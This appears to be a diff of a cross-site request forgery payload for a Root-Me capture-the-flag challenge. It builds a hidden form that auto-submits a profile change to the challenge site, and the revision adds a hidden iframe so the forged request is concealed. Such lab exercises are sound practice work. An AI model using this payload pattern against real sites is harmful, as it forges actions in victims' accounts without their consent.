@@ -1,5 +1,7 @@
-<form name=“badform” method=“post” enctype="multipart/form-data" action=“http://challenge01.root-me.org/web-client/ch22/?action=profile">
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form id=“csrf-form” target="csrf-frame" method=“POST” enctype="multipart/form-data" action=“http://challenge01.root-me.org/web-client/ch22/?action=profile">
 <input type=“hidden” name=“username” value=“hey”>
 <input type=“hidden” name=“status” value=“on”>
+<input type="submit" value="submit">
 </form>
-<script>document.badform.submit()</script>
+<script>document.getElementById("csrf-form").submit()</script>
